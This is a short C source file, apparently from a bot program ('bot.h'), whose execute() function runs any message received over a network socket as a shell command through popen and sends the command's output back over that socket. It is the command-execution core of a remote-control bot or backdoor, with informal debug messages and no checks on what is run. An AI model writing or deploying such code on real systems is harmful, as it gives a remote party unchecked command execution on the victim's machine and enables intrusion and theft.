#include"bot.h"

int execute(char* msg, int socket){

	char output[200];
	
	FILE *f = popen(msg, "r");

	if(f == NULL){

		printf("so sad popen didnt work.\n");

		return(-1);
	}

	while(fgets(output, 200, f) != NULL){
	    
        int output_size = strlen(output);
 
        int send_return = send(socket, output, output_size, 0);

	    printf("%s", output);
	}

	int status = pclose(f);
	if(status == -1){
	
		printf("pclose sucks\n");	
	}

	return(1);	
}
